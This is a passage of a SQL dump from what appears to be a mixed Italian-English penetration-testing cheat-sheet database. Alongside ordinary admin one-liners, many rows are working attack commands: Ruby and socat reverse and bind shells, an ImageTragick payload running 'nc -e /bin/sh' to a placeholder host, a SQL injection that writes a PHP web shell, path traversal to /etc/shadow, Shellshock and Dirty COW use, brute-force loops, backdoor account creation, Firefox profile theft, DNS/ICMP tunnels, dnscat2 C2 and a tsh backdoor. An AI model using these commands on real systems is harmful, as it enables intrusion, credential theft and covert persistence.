08:20:23','null_session','ridenum.py 192.168.XXX.XXX 500 50000 dict.txt'),(373,'2017-06-09 08:20:23','Rimuovere linee vuote','sed -e \'s/^\\s*$/d/g\' '),(374,'2017-06-09 08:20:23','Rimuovere un certo numero di caratteri dalla fine','cat file.txt | rev | cut -c <num carateri +1> |rev > output.txt '),(377,'2017-06-09 08:20:23','ruby reverse shell','ruby -rsocket -e\'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\' '),(378,'2017-06-09 08:20:23','ruby','ruby -rwebrick -e \"WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start\"'),(380,'2017-06-09 08:20:23','windows','rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-)'),(389,'2017-06-09 08:20:23','windows','schtasks /query /fo csv /v > %TEMP% '),(390,'2017-06-09 08:20:23','windows','sc query'),(391,'2017-06-09 08:20:23','suid','script con suid : #! /bin/bash -   Fondamentale il trattino alla fine altrimenti lo script viene eseguito ma il sistema filtra il suid e lo esegue con diritti utente '),(394,'2017-06-09 08:20:23','sed','sed -e \'s/<[a-z].*>//g\' davinci '),(395,'2017-06-09 08:20:23','sed','sed -e \'s/ /\n/g\' osint '),(396,'2017-06-09 08:20:23','sed','sed -e \'s/	//g\' osint2 '),(397,'2017-06-09 08:20:23','sed','sed \'/^\\s*$/d\' osint3 '),(403,'2017-06-09 08:20:23','Shares the C drive (you can specify any drive) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.','net share nothing$=C:\\ /grant:hacker,FULL /unlimited'),(406,'2017-06-09 08:20:23','shellshock','./shocker.py -H TARGET  --command \"/bin/cat /etc/passwd\" -c /cgi-bin/status --verbose'),(415,'2017-06-09 08:20:23','sid utente','whoami /user '),(416,'2017-06-09 08:20:23','sid utente','wmic useraccount where name=\"e.lindsey\" get sid '),(418,'2017-06-09 08:20:23','smb','smbclient -L //192.168.1.100 '),(419,'2017-06-09 08:20:23','smb','smbclient -L 192.168.1.10 -U administrator '),(420,'2017-06-09 08:20:23','smb','smbclient -L //192.168.99.131'),(421,'2017-06-09 08:20:23','smtp','smtp-user-enum.pl -M VRFY -u /user.txt -t ip_mailserver '),(422,'2017-06-09 08:20:23','snmp','snmpcheck-1.8.pl -t 10..10.10.20 (information gathering) '),(423,'2017-06-09 08:20:23','snmp','snmpcheck -t 192.168.1.X -c public'),(424,'2017-06-09 08:20:23','snmp','snmpenum -t 192.168.1.X'),(425,'2017-06-09 08:20:23','snmp','snmpwalk -c public -v1 192.168.1.X 1|  grep hrSWRunName|cut -d* * -f '),(426,'2017-06-09 08:20:23','snmp','snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 |cut -d” “ -f4'),(427,'2017-06-09 08:20:23','socat','socat TCP4-LISTEN:8080,fork socks4a:127.0.0.1:192.168.1.119:80,socksport=3128 & '),(428,'2017-06-09 08:20:23','socat','socat -v -v openssl-listen:443,bind=localhost,reuseaddr,fork,cert=FILENAME.pem,cafile=FILENAME.crt,verify=0 openssl-connect::,verify=0 '),(429,'2017-06-09 08:20:23','socat','socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 - '),(432,'2017-06-09 08:20:23','spawn shell','(From within IRB) exec \"/bin/sh\" '),(433,'2017-06-09 08:20:23','spawn shell','(From within nmap) !sh '),(434,'2017-06-09 08:20:23','spawn shell','(From within vi) :!bash '),(435,'2017-06-09 08:20:23','spawn shell','(From within vi) :set shell=/bin/bash  :shell '),(747,'2017-06-12 20:20:22','pwershell dowload','powershell -nop -c \"$r=New-Object System.Net.WebClient;$r.DownloadFile(\'http://192.168.178.31/test.txt\', \'c:\\test\\test.txt)\"'),(439,'2017-06-09 08:20:23','spawn shell','ruby: exec \"/bin/sh\" '),(440,'2017-06-09 08:20:23','spawn shell','usermod -s /bin/sh -u apache   '),(441,'2017-06-09 08:20:23','sql','avviare server con --skip-grant-tables '),(442,'2017-06-09 08:20:23','sql','GRANT ALL PRIVILEGES ON nome_db.* TO \'nome_utente\'@\'localhost\' IDENTIFIED BY \'pass_utente\' WITH GRANT OPTION; '),(444,'2017-06-09 08:20:23','sql','Sqli blind time based on http headers: X-Forwarded-For: sqlmap -u http://192.168.1.6/show.php --headers=\"X-Forwarded-For: *\" --dbs '),(448,'2017-06-09 08:20:23','sqli ','(select group_concat(column_name) from information_schema.columns where table_name=\"Nome Tabella\") '),(449,'2017-06-09 08:20:23','sqli ','(select group_concat(id, 0x3A, username, 0x3A, password) from dev_account) '),(450,'2017-06-09 08:20:23','sqli ','(select group_concat(table_name) from information_schema.tables where table_schema=database()) '),(464,'2017-06-09 08:20:23','sql','SET PASSWORD FOR \'user\'@\'hostname\' = PASSWORD(\'passwordhere\'); '),(465,'2017-06-09 08:20:23','sqli','SQL \'UNION SELECT null,null,null,\"<?php passthru($_GET[\'cmd\']);?>\",null,null,null,null INTO DUMPFILE \"/var/www/evil.php\" '),(466,'2017-06-09 08:20:23','sql','UPDATE SET campo1= \'valore\',campo2=\'valore\' FROM tabella WHERE condizione '),(467,'2017-06-09 08:20:23','sql','UPDATE user SET Password=PASSWORD( \'your_new_password\') where USER=\'root\'; '),(469,'2017-06-09 08:20:23','ssh proxy','ssh -D 8888 192.168.1.108 '),(470,'2017-06-09 08:20:23','sudoers','go2linux ALL=(ALL) ALL NO PASSWD: ALL '),(471,'2017-06-09 08:20:23','bash','sudo mount -t smbfs -o username=UTENTEWINDOWS,password=PASSWDWINDOWS //INDIRIZZOIPSERVER/CARTELLA /media/Esempio '),(472,'2017-06-09 08:20:23','svuotare file di una cartella','find . -type f -exec sh -c \'>{}\' \\; '),(480,'2017-06-09 08:20:23','windows','tasklist /svc'),(483,'2017-06-09 08:20:23','tcpdump -i interface (any) -n (don\'t resolve dns) -X (display both hex and ascii) -s0 (capture all packets legnht) -w (write to file)','tcpdump -i any -n -X -s0 -w dump.pcap'),(484,'2017-06-09 08:20:23','tcpdump','tcpdump tcp port 80 -w output.pcap -i eth0'),(485,'2017-06-09 08:20:23','mitm','tcpxtract -d eth0 -o pademo/ '),(487,'2017-06-09 08:20:23','testssl','./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html  '),(488,'2017-06-09 08:20:23','bruteforce','thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst'),(489,'2017-06-09 08:20:23','oracle','tnscmd10g version -h TARGET'),(490,'2017-06-09 08:20:23','Trova e sostituisci','perl -pi -e \'s/abc/XYZ/g\' /tmp/file   '),(491,'2017-06-09 08:20:23','Trova e sostituisci','repalce \"abc\" \"XYZ\"  '),(492,'2017-06-09 08:20:23','Trova e sostituisci','sed -i -e \'s/abc/XYZ/g\' /tmp/file '),(522,'2017-06-09 08:20:23','wget','wget http://username:password@example.org/url/ '),(523,'2017-06-09 08:20:23','wget','wget --http-user=user --http-password=password http://example.org/url/ '),(528,'2017-06-09 08:20:23','windows ping sweeper','C:\\> FOR /L %i in (1,1,255) do @ping -n 1 10.10.10.%i | find \"Reply\" '),(531,'2017-06-09 08:20:23','windows post exploitation','netdom join <name of computer joining domain> /Domain:<domain to be joined> /UserD:<name of domain user with permission to join the domain> /PasswordD:* /REBoot '),(532,'2017-06-09 08:20:23','windows post exploitation','netdom /renamecomputer <Current Computer Name> /newname:<Desired Computer Name> '),(533,'2017-06-09 08:20:23','windows post exploitation','net group \"Domain Controllers\" /domain  (elenca i DC del dominio) '),(534,'2017-06-09 08:20:23','windows post exploitation','net localgroup \"Administrators\" knx /add '),(535,'2017-06-09 08:20:23','windows post exploitation','net localgroup (gruppi sulla macchina) '),(536,'2017-06-09 08:20:23','windows post exploitation','net local group \"Remote Desktop users\" '),(537,'2017-06-09 08:20:23','windows post exploitation','net localgroup \"Remote Desktop Users\" knx /add '),(538,'2017-06-09 08:20:23','windows post exploitation','netsh firewall add portopening TCP 3389 \"Remote Desktop\" '),(539,'2017-06-09 08:20:23','windows post exploitation','netsh firewall show config '),(540,'2017-06-09 08:20:23','windows post exploitation','netstat -an |findstr :3389 '),(541,'2017-06-09 08:20:23','windows post exploitation','net user guest_1 guestpwd /add '),(542,'2017-06-09 08:20:23','windows post exploitation','net user knx password /add '),(543,'2017-06-09 08:20:23','windows post exploitation','utenti appartenenti al gruppo indicato net localgroup Administrators   '),(544,'2017-06-09 08:20:23','windows post exploitation','utenti del computer net user  '),(545,'2017-06-09 08:20:23','windows post exploitation','utenti del dominio net user /domain  '),(546,'2017-06-09 08:20:23','windows post exploitation','utenti di dominio net view /domain  '),(548,'2017-06-09 08:20:23','windows','wmic bios'),(549,'2017-06-09 08:20:23','windows','wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)'),(550,'2017-06-09 08:20:23','windows','wmic /node:192.168.1.70 /user:\"administrator\" rdtoggle where allowtsconnections=0 call setallowtsconnections 1 '),(551,'2017-06-09 08:20:23','windows','wmic /node:\"hostname\" bios get serialnumber (this can be great for finding warranty info about target)'),(552,'2017-06-09 08:20:23','windows','wmic os'),(553,'2017-06-09 08:20:23','windows','wmic process call create “process_name” (executes a program)'),(554,'2017-06-09 08:20:23','windows','wmic process get caption,executablepath,commandline'),(555,'2017-06-09 08:20:23','windows','wmic process where name=”process_name” call terminate (terminates program)'),(556,'2017-06-09 08:20:23','windows','wmic product get name /value (this gets software names)'),(557,'2017-06-09 08:20:23','windows','wmic product where name=\"XXX\" call uninstall /nointeractive (this uninstalls software)'),(558,'2017-06-09 08:20:23','windows','wmic qfe'),(559,'2017-06-09 08:20:23','windows','wmic qfe get hotfixid  (This gets patches IDs)'),(560,'2017-06-09 08:20:23','windows','wmic service'),(561,'2017-06-09 08:20:23','windows','wmic service list brief (mostra una lista ancora piu dettagliata) '),(562,'2017-06-09 08:20:23','windows','wmic service  (mostra un bel listato con tutti i servizi e le informazioni) '),(563,'2017-06-09 08:20:23','windows','wmic share get /ALL (you can use ? for gets help ! )'),(564,'2017-06-09 08:20:23','windows','wmic startup'),(565,'2017-06-09 08:20:23','windows','wmic startup list full (this can be a huge list!!!)'),(566,'2017-06-09 08:20:23','windows','wmic useraccount get /ALL'),(567,'2017-06-09 08:20:23','windows','wmic useraccount (usernames, sid, and various security related goodies)'),(568,'2017-06-09 08:20:23','windows','wscript.exe <script js/vbs>'),(569,'2017-06-09 08:20:23','lfi','www.example.com/index.php?m=php://filter/convert.base64-encode/resource=index '),(570,'2017-06-09 08:20:23','windows','xcopy /C /S %appdata%\\Mozilla\\Firefox\\Profiles\\*.sqlite \\your_boxirefox_funstuff'),(572,'2017-06-09 08:20:23','bash','zcat /pentest/rockyou.txt.gz |php sha_md5.php > rockyou_sha_md5.txt   dove   sha_md5.php è: <?php while($f = fgets(STDIN){$passwenc = mf5(sha1(rtrim($f))); echo \"$passwenc : $f\";}?> '),(573,'2017-06-09 08:20:23','zip file cracking password','fcrackzip -v -D -u -p /pentest/rockyou.txt Whistler.zip '),(575,'2017-06-09 08:20:23','nmap shellshock test','nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/printenv,cmd=ls IP -v'),(576,'2017-06-09 08:20:23','nmap oracle script','nmap -sV --script oracle-sid-brute IP -p 1521 -v'),(577,'2017-06-09 08:20:23','DNS Amplification','dig ANY google.com @IP'),(578,'2017-06-09 08:20:23','DNS Cache Snooping','nmap -sU -p 53 --script dns-cache-snoop.nse --script-args \'dns-cache-snoop.mode=timed\' IP -Pn'),(579,'2017-06-09 08:20:23','DNS Cache Snooping','nmap -sU -p 53 --script dns-cache-snoop.nse --script-args \'dns-cache-snoop.mode=timed\' IP -Pn -d'),(580,'2017-06-09 08:20:23','DNS Recursion','dig recurse google.com @IP'),(581,'2017-06-09 08:20:23','Path Traversal root','GET ///../../../../../../../../../../etc/shadow/ HTTP/1.1'),(582,'2017-06-09 08:20:23','SNMP snmpwalk how to','snmpwalk -v 1 -c public IP'),(583,'2017-06-09 08:20:23','SNMP snmp walk example','snmpwalk IP -c public -v 2c'),(684,'2017-06-09 08:20:23','php web server command line','php -S 127.0.0.1:8080\n'),(586,'2017-06-09 08:20:23','shellshock test','x=\'() { :;}; echo VULNERABLE\' bash -c : '),(587,'2017-06-09 08:20:23','setuid setgid post privileges escalation','find / -perm -4000 -o -perm -2000 2>&1 | grep -v \"Permission denied\\|No such file\" | xargs ls -al'),(588,'2017-06-09 08:20:23','bash urldecode','$ alias urldecode=\'python -c \"import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])\"\''),(589,'2017-06-09 08:20:23','bash urlencode','$ alias urlencode=\'python -c \"import sys, urllib as ul; print ul.quote_plus(sys.argv[1])\"\''),(590,'2017-06-09 08:20:23','php file upload','<?php \nif (isset($_POST[\'submit\'])){ \nif($_FILES[\"file\"][\"error\"]) { \necho \"errore nel caricamento del file!!\"; \nexit(); \n} \nelse \n{ \nmove_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $_FILES[\"file\"][\"name\"]); \necho \"hai caricato la tua foto in: \" .$_FILES[\'file\'][\'name\']; \n} \n} \n?> \n<html><form action=\"\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"file\"><input type=\"submit\" name=\"submit\" value=\"Upload\"></form></html>'),(591,'2017-06-09 08:20:23','spacial chars','!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'),(592,'2017-06-09 08:20:23','bash ciclo for line in file','while read p; do echo $p done <file.txt'),(593,'2017-06-09 08:20:23','image magick tragick esempio','push graphic-context \nviewbox 0 0 640 480 \nfill \'url(https://127.0.0.1/oops.jpg\"|touch \"/tmp/hacked)\' \npop graphic-context \noppure \nfill \'url(https://127.0.0.1/someimage.jpg\"|nc -e /bin/sh IP_ADDRESS_HERE \"PORT_HERE)\''),(594,'2017-06-09 08:20:23','ip port forward windows','netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=443 connectaddress=<OUR_PUBLIC_IP>'),(595,'2017-06-09 08:20:23','git remember password','git config --global credential.helper cache'),(596,'2017-06-09 08:20:23','git rimuovi file remoti','git rm *'),(597,'2017-06-09 08:20:23','git aggiorna il repository online','git add --all \ngit commit -m \"commit blah blah\" \ngit push -u origin master'),(598,'2017-06-09 08:20:23','crea utente linux','useradd -m username \npasswd username \nusermod -a -G sudo username \nchsh -s /bin/bash username'),(599,'2017-06-09 08:20:23','rsync sincronizzare 2 cartelle','rsync -rtvu --delete source_folder/ destination_folder/'),(600,'2017-06-09 08:20:23','wfuzz','wfuzz.py --hc 404 -w /home/knx/tools/PasswordList/directory-list-2.3-small.txt http://192.168.1.149/FUZZ'),(601,'2017-06-09 08:20:23','connessioni attive','watch ss -tp'),(602,'2017-06-09 08:20:23','conessioni stabilite','lsof -i'),(603,'2017-06-09 08:20:23','set default gateway','route add default gw IP'),(604,'2017-06-09 08:20:23','cambiare mac','export MAC=xx:xx:xx:xx:xx:xx'),(605,'2017-06-09 08:20:23','aggiungere un dns','echo \"nameserver 8.8.8.8\" >> /etc/resolv.conf'),(606,'2017-06-09 08:20:23','user enumeration linux','getent passwd'),(607,'2017-06-09 08:20:23','aggiungere un path alla PATH','PATH=$PATH:/mypath'),(608,'2017-06-09 08:20:23','Pyton SimpleHTTPServer on localhost','python -c \'import BaseHTTPServer as bhs, SimpleHTTPServer as shs; bhs.HTTPServer((\"127.0.0.1\", 8888), shs.SimpleHTTPRequestHandler).serve_forever()\'\n'),(609,'2017-06-09 08:20:23','abilitare desktop remoto da remoto','net user knx password /add\nnet localgroup \"Remote Desktop Users\" knx /add\nrun getgui -e\n\nrdesktop 10.10.10.20 -u knx\n\nOPPURE\n\nAbilitare il Remote Desktop\nwmic /node:192.168.1.70 /user:\"administrator\" rdtoggle where allowtsconnections=0 call setallowtsconnections 1\nIl sistema risponderà:\nImmettere la password :*******\nImmettere la password e se tutto è andato bene il sistema risponderà\nEsecuzione di (\\\\1TO1120\\ROOT\\1120\")->setallowtsconnections(Esecuzione del metodo Parametri Out:\ninstance of     PARAMETERS\n{\nReturnValue = 0;\n};\n  \n\nOppure tramite meterpreter\n'),(613,'2017-06-09 08:20:23','antenne wifi','Ubiquiti SRC          chip Atheros          2 antenne esterne\n\nAlfa AWUS050NH     chip Ralink RT2770F     Antenna esterna\n'),(614,'2017-06-09 08:20:23','arp scan','usare netdiscover -i tap0 -r 172.16.5.0/24\n\noppure\n\nnmap -PR -sn 192.168.1.1-255\n'),(615,'2017-06-09 08:20:23','autorun example','[AutoRun]     \nicon=hdd.ico     \nlabel=DATI\n'),(616,'2017-06-09 08:20:23','bash directory bruteforce','#!/bin/bash\npath=\"$1\"\n\nwhile IFS=\'\' read -r directory || [[ -n \"$directory\" ]]; do\n    if [ -d \"$path/$directory\" ]; then\n      printf \"[+] Directory $path/$directory exists!\\n\"\n    fi\ndone < \"$2\"\n'),(617,'2017-06-09 08:20:23','Bash estrapolare tutte le stringhe in un testo tra 2 marcatori','\necho $TEXT | perl -e \'while ($l=<STDIN>) {$l=~/title=\"(.*)\"/ && print \"$1\\n\";}\'\n'),(618,'2017-06-09 08:20:23','Bash estrapolare una data','\n echo $STRING | perl -e \'$l=<STDIN>; {$l=~/(\\d{4})\\/(\\d{2})\\/(\\d{2})/ && print \"$3-$2-$1\\n\";}\'\n'),(619,'2017-06-09 08:20:23','Bash estrapolare un ora','\n echo $STRING | perl -e \'$l=<STDIN>; {$l=~/\\s+(\\d{2}:\\d{2})/ && print \"$1\\n\";}\'\n'),(620,'2017-06-09 08:20:23','Bash FTP automatico con MGET','\n#! /bin/bash\n \nHOSTNAME=\"123.45.68.95\"\nUTENTE=\"ddarix\"\nPASSWORD=\"********\"\nCARTELLA=\"/root/backup/\"\nFILENAME=\"*.*\"\n \n \necho \"user ${UTENTE} ${PASSWORD}\" > /tmp/ftp_cmd\necho \"prompt\" >> /tmp/ftp_cmd\necho \"cd ${CARTELLA}\" >> /tmp/ftp_cmd\necho \"mget ${FILENAME} \" >> /tmp/ftp_cmd\n \nftp -n ${HOSTNAME} < /tmp/ftp_cmd\n'),(621,'2017-06-09 08:20:23','bash - How do I curl a request to bruteforce an unsecure login - Stack Overflow','\nurl=\"http://foo.dev/login\"\nfor user in $(userlist_gen); do\n  for pass in $(passlist_gen); do\n    http_code=$(curl -L --data-urlencode  user=\"$user\" --data-urlencode password=\"$pass\" \"$url\" -w \'%{http_code}\' -o /dev/null -s)\n    if [[ $http_code -eq 302 ]]; then\n      echo \"Success: User: \'$user\' Pass: \'$pass\'\"\n      break 2\n    fi\n  done\ndone\n'),(622,'2017-06-09 08:20:23','Bash modifica estensioni file con un ciclo','\nfor inputfile in *.JPG\n  do\n     texfile=${inputfile%???}jpg\n  done\n'),(623,'2017-06-09 08:20:23','Bash montare samba','\nsmbmount //IP_ADDRESS/C$ /mnt/client/ -o username=Administrator,password=password\n'),(624,'2017-06-09 08:20:23','Bash rsync backup incrementale','\n#!/bin/bash\n \nrsync -va --delete /dati/ /backup/2-DATI/ --log-file=/log/datibackup.log\n\n#/dati = cartella di origine\n#/backup/2-DATI = cartella di destinazione\n'),(625,'2017-06-09 08:20:23','Bash tar ricorsivo','\n#!/bin/bash\n        for i in $( ls /dati ); do\n           tar czvpf $i.tgz /dati/$i\n           mv $i.tgz /backup/2-DATI\n        done\n'),(626,'2017-06-09 08:20:23','Bash trap segnali di sistema','\n#!/bin/bash\n  # catturiamo la sequenza di tasti Ctrl-c ed eseguiamo la funzione spiacente()\n  trap spiacente INT\n  # la funzione spiacente stampa semplicemente un messaggio\n  spiacente()\n  {\n     echo \"Spiacente, non puoi farlo\"\n     sleep 3\n  }\n'),(627,'2017-06-09 08:20:23','sudo sudoers senza password','knx ALL=ALL NOPASSWD: ALL\n'),(628,'2017-06-09 08:20:23','dirtycow add passwd entry','gcc -pthread -o dirty 40839.c -lcrypt\n./dirty\nadd new user and the script add new line in /etc/passwd with new user e new random password\n'),(629,'2017-06-09 08:20:23','dirtycow more stable','echo 0 > /proc/sys/vm/dirty_writeback_centisecs\n'),(630,'2017-06-09 08:20:23','set suid bit to a python','sudo chmod 4777 /usr/bin/python2.7\n'),(631,'2017-06-09 08:20:23','iscsi connettersi con un sistema','# iscsiadm --mode discovery --type sendtargets --portal 192.168.56.101\n192.168.56.101:3260,1 iqn.2017-02.local.skuzzy:storage.sys0\n'),(632,'2017-06-09 08:20:23','iscsi login and mount disk','iscsiadm --mode node --targetname iqn.2017-02.local.skuzzy:storage.sys0 --portal 192.168.56.101:3260 --login\n'),(633,'2017-06-09 08:20:23','decrypt file encrypt with openssl','#!/bin/bash\n\nPASSWORDS=$(cat \"./rockyou.txt\")\n\nfor PASSWORD in $PASSWORDS; do\nopenssl enc -d -aes-256-cbc -md sha256 -in ToAlice.csv.enc -out ToAlice.csv -k $PASSWORD\nRET=$?\n\nif [ $RET -eq 0 ]; then\n    echo \"Candidate password: $PASSWORD\"\nfi\ndone\n'),(634,'2017-06-09 08:20:23','VPN over SSH','Since openssh release 4.3 it is possible to tunnel layer 3 network traffic via an established ssh channel. This has an advantage over a typical tcp tunnel because you are in control of ip traffic. So, for example, you are able to perform SYN-scan with nmap and use your tools directly without resorting to proxychains or other proxifying tools. It\'s done via the creation of tun devices on client and server side and transferring the data between them over ssh connection. This is quite simple, but you need root on both machines since the creation of tun devices is a privileged operation. These lines should be present in your /etc/ssh/sshd_config file (server-side):\n\n	PermitRootLogin yes\n	PermitTunnel yes\n\nThe following command on the client will create a pair of tun devices on client and server:\n\n	ssh username@server -w any:any\n\nThe flag -w accepts the number of tun device on each side separated with a colon. It can be set explicitly - -w 0:0 or you can use -w any:any syntax to take the next available tun device.\n\nThe tunnel between the tun devices is enabled but the interfaces are yet to be configured. Example of configuring client-side:\n\n	ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0\n\nServer-side:\n\n	ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0\n\nEnable ip forwarding and NAT on the server:\n\n	echo 1 > /proc/sys/net/ipv4/ip_forward\n	iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE\n\nNow you can make the peer host 1.1.1.1 your default gateway or route a specific host/network through it:\n\n	route add -net 10.0.0.0/16 gw 1.1.1.1\n\nIn this example the server\'s external network interface is eth0 and the newly created tun devices on both sides are tun0.\n'),(635,'2017-06-09 08:20:23','3proxy proxy tool','Get it here - https://github.com/z3APA3A/3proxy/releases. This tools works for multiple platforms. There are pre-built binaries for Windows. As for Linux, you will need to build it yourself which is not a rocket science, just ./configure && make :) This tool is a swiss army knife in the proxy world so it has a ton of functionality. I usually use it either as a socks proxy or as a port forwarder.\n\nThis tool gets all of its options from config file. To run it:\n\n3proxy.exe config_file\n\nor if you are on a Linux system:\n\n./3proxy config_file\n\nTo run 3proxy as a socks5 proxy at port 1080 put the following line in the config:\n\nsocks -p1080\n\nNow it\'s possible to tunnel most of your pentesting tools through this proxy to develop the attack in the internal network. This is just a basic setup which is not very secure. You can play with options to place authentication and/or ip-based access control rules. Go check the full manual here - https://3proxy.ru/howtoe.asp. To tunnel a specific port use the following syntax:\n\ntcppm <localport> <targethost> <targetport>\n'),(636,'2017-06-09 08:20:23','rpivot reverse socks proxy','This is my favorite method of traversing NAT connections. Rpivot is a reverse socks proxy tool that allows you to tunnel traffic via socks proxy. It connects back to your machine and binds a socks proxy on it. It works just like ssh -D but in opposite direction. Server side:\n\n	python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0\n\nClient side:\n\n	python client.py --server-ip <ip> --server-port 9999\n\nAs a result, a socks4 proxy service will be bound server side on port 1080.\n'),(637,'2017-06-09 08:20:23','icmp ICMP tunnelling','If icmp traffic is allowed to external networks then most likely you can establish an icmp tunnel. The downside is that you will need root/administrator privileges on the target system becase of the necesity to use raw sockets. Check this tool out - http://code.gerade.org/hans.  Personally I\'ve never tried running it on Windows. It works like a charm on Linux tho. Server side command (attacker\'s machine):\n\n\n	./hans -v -f -s 1.1.1.1 -p P@ssw0rd\n\nThe -v flag is for verbosity, the -f flag is to run in foreground and the -s flag\'s value is the server\'s ip on the newly created tun interface.\n\nClient side:\n\n	./hans -f -c <server_ip> -p P@ssw0rd -v\n\nAfter successful connection the client should be directly visible at 1.1.1.100:\n\n# ping 1.1.1.100\nPING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.\n64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms\n\nNow you can use this machine as gate into the internal network. Use this machine a default gateway or connect to a management interface (ssh/tsh/web shell).\n'),(638,'2017-06-09 08:20:23','DNS dns tunnel','If so happens that you got root access on the server you can try iodine. It works almost like hans icmp tunneling tool - it creates a pair of tun adapters and tunnels data between them as DNS queries. Server side:\n\n	iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com\n\nClient side:\n\n	iodine -f -P P@ssw0rd tunneldomain.com -r\n\nSuccessful connection will yield direct client visibility at address 1.1.1.2. Note, that this tunneling technique is quite slow. Your best bet is to use a compressed ssh connection over the resulting connection:\n\n	ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080	\n'),(639,'2017-06-09 08:20:23','DNS tunnel dnscat2','Dnscat2\n\nDnscat2 establishes C&C channel over recursive DNS queries. This tool doesn\'t require root/administrator access (works both on windows and linux). It also supports port forwarding. Server side:\n\n	ruby ./dnscat2.rb tunneldomain.com\n\nClient side:\n\n	./dnscat2 tunneldomain.com\n\nAfter you receive a connection of server side, you can view the active sessions with windows command:\n\n	dnscat2> windows\n	0 :: main [active]\n  	dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]\n  	1 :: command session (debian)\n  	2 :: sh (debian) [*]\n\nTo initiate port forwarding select a command session with session -i <num>:\n\n	dnscat2> session -i 1\n	New window created: 1\n	New window created: 1\n	history_size (session) => 1000\n\n	This is a command session!\n\n	That means you can enter a dnscat2 command such as\n	\'ping\'! For a full list of clients, try \'help\'.\n\n	command session (debian) 1>\n\n\nUse listen [lhost:]lport rhost:rport command to forward a port:\n\ncommand session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80\n\nThis will bind port 8080 on the attacker\'s machine and forward all connections to 10.0.0.20:80.\n\n'),(640,'2017-06-09 08:20:23','corporate proxy as wayout','I already mentioned this tool in the NAT traversal section. It also supports connecting to the outside world via NTLM HTTP proxies. Server side command remains intact, use client-side command as follows:\n\npython client.py --server-ip <rpivot_server_ip> --server-port 9999\\\n--ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM\\\n--username Alice --password P@ssw0rd\n\nOr if you have LM:NT hashes instead of password:\n\npython client.py --server-ip <rpivot_server_ip>\\\n--server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM\\\n--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45\n'),(641,'2017-06-09 08:20:23','cntlnm proxy','Cntlm is the tool of choice for running any non-proxy aware programs over NTLM-proxy. Basically this tool authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. This port bound does not require any authentication so you can use your tools directly (putty/ssh for example). It uses a config file for its operation. Here\'s a barebones config example to forward port 443 (this port is most likely to be allowed through the proxy):\n\nUsername Alice\nPassword P@ssw0rd\nDomain CONTOSO.COM\nProxy 10.0.0.10:8080\nTunnel 2222:<attackers_machine>:443\nRun it:\n\ncntlm.exe -c config.conf\n\nOr if you\'re on Linux:\n\n./cntlm -c config.conf\n\nNow, given you have ssh running on the remote host on port 443, you can launch ssh client (openssh/putty) and connect to local port 2222 to get access to the external machine.\n'),(642,'2017-06-09 08:20:23','DNS with proxychains','Proxychains doesn\'t follow socks RFC when it comes to resolving hostnames. It intercepts gethostbyname libc call and tunnels tcp DNS request through the socks proxy. The things is, the DNS server is hardcoded to 4.2.2.2. You might want to change the nameserver in order to resolve names on the internal network. A typical scenario is to change the nameserver to domain controller if you are pentesting windows environment. The setup is located at /usr/lib/proxychains3/proxyresolv:\n\n\n#!/bin/sh\n# This script is called by proxychains to resolve DNS names\n\n# DNS server used to resolve names\nDNS_SERVER=${PROXYRESOLV_DNS:-4.2.2.2}    #change nameserver here\n\n\nif [ $# = 0 ] ; then\n    echo \"  usage:\"\n    echo \"      proxyresolv <hostname> \"\n    exit\nfi\n'),(643,'2017-06-09 08:20:23','socat bind shell','listener:\n	socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane\n\nConnect to listener:\n	socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337\n'),(644,'2017-06-09 08:20:23','socat reverse shell','listener:\n	socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0\n\nconnect to attacker\'s machine:\n	socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane\n'),(645,'2017-06-09 08:20:23','change terminal size','$ stty -a\nspeed 38400 baud; rows 57; columns 211; line = 0;\n\napply deisred size to your socat termianl:\n\n$ stty rows 57 cols 211\n'),(646,'2017-06-09 08:20:23','tsh ','Tsh is a small ssh-like backdoor with full-pty terminal and with capability of file transfer. This tool has very small footprint and is easily built on most unix-like systems. Start with editing tsh.h file:\n	#ifndef _TSH_H\n	#define _TSH_H\n	char *secret = \"never say never say die\";\n	#define SERVER_PORT 22\n	short int server_port = SERVER_PORT;\n	/*\n	#define CONNECT_BACK_HOST  \"localhost\"\n	#define CONNECT_BACK_DELAY 30\n	*/\n	#define GET_FILE 1\n	#define PUT_FILE 2\n	#define RUNSHELL 3\n	#endif /* tsh.h */\n	\nChange secret, 